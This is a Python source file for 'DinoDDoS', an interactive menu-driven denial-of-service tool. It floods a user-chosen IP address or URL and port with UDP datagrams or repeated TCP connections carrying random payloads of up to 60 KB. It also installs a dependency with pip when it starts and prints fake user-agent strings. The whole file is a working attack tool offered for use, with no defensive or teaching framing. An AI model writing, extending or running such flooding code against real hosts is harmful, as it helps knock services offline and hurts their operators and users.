import importlib
import subprocess

required_modules = ["faker"]

for module in required_modules:
    try:
        importlib.import_module(module)
    except ImportError:
        print(f"Installing {module}...")
        try:
            subprocess.check_call(["pip", "install", module])
        except subprocess.CalledProcessError as e:
            print(f"Failed to install {module}. Error: {e}")

import time
import socket
import re
import os
from urllib.parse import urlparse
from faker import Faker

MAX_PAYLOAD_SIZE = 60  # Maximum payload size in KB (RECOMMENDED)


def perform_udp_flood(target, port, payload_size, payload_counts):
    faker = Faker()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload_size_bytes = payload_size * 1024
    sent = 0
    for _ in range(payload_counts):
        user_agent = faker.user_agent()
        payload = os.urandom(payload_size_bytes)
        sock.sendto(payload, (target, port))
        sent += 1
        print(f"Sent UDP packet {sent}/{payload_counts} to {target} on port: {port} (User-Agent: {user_agent})")
        time.sleep(0.1)


def perform_tcp_flood(target, port, payload_size, payload_counts):
    faker = Faker()
    payload_size_bytes = payload_size * 1024
    sent = 0
    for _ in range(payload_counts):
        user_agent = faker.user_agent()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        payload = os.urandom(payload_size_bytes)
        sock.send(payload)
        sock.close()
        sent += 1
        print(f"Sent TCP packet {sent}/{payload_counts} to {target} on port: {port} (User-Agent: {user_agent})")
        time.sleep(0.1)


def extract_ip(url):
    parsed_url = urlparse(url)
    if parsed_url.netloc:
        ip_match = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", parsed_url.netloc)
        if ip_match:
            return ip_match.group()
    return parsed_url.netloc


def clear_terminal():
    if os.name == "posix":
        os.system("clear")
    elif os.name == "nt":
        os.system("cls")


def show_menu():
    clear_terminal()
    print("DinoDDoS")
    print("Author: https://github.com/daniisaahir\n")
    print("=== MENU ===")
    print("1. UDP Attack")
    print("2. TCP Attack")
    print("3. Exit")


def get_menu_choice():
    while True:
        choice = input("Enter your choice: ")
        if choice in ["1", "2", "3"]:
            return int(choice)
        print("Invalid choice. Please try again.")


def main():
    while True:
        show_menu()
        choice = get_menu_choice()

        if choice == 1:
            target = input("Enter IP address or URL: ")
            port = int(input("Enter Port: "))
            payload_size = int(input(f"Enter Payload Size (up to {MAX_PAYLOAD_SIZE} KB): "))
            payload_counts = int(input("Enter Payload Counts: "))

            if payload_size > MAX_PAYLOAD_SIZE:
                print(f"Payload size exceeds the maximum limit of {MAX_PAYLOAD_SIZE} KB. Setting payload size to {MAX_PAYLOAD_SIZE} KB.")
                payload_size = MAX_PAYLOAD_SIZE

            if not re.match(r"https?://", target):
                target = "http://" + target

            target_ip = extract_ip(target)
            if not target_ip:
                print("Invalid IP address or URL")
                continue

            print("Starting...")
            time.sleep(3)

            perform_udp_flood(target_ip, port, payload_size, payload_counts)

        elif choice == 2:
            target = input("Enter IP address or URL: ")
            port = int(input("Enter Port: "))
            payload_size = int(input(f"Enter Payload Size (up to {MAX_PAYLOAD_SIZE} KB): "))
            payload_counts = int(input("Enter Payload Counts: "))

            if payload_size > MAX_PAYLOAD_SIZE:
                print(f"Payload size exceeds the maximum limit of {MAX_PAYLOAD_SIZE} KB. Setting payload size to {MAX_PAYLOAD_SIZE} KB.")
                payload_size = MAX_PAYLOAD_SIZE

            if not re.match(r"https?://", target):
                target = "http://" + target

            target_ip = extract_ip(target)
            if not target_ip:
                print("Invalid IP address or URL")
                continue

            print("Starting...")
            time.sleep(3)

            perform_tcp_flood(target_ip, port, payload_size, payload_counts)

        elif choice == 3:
            print("Exiting...")
            break


if __name__ == "__main__":
    main()
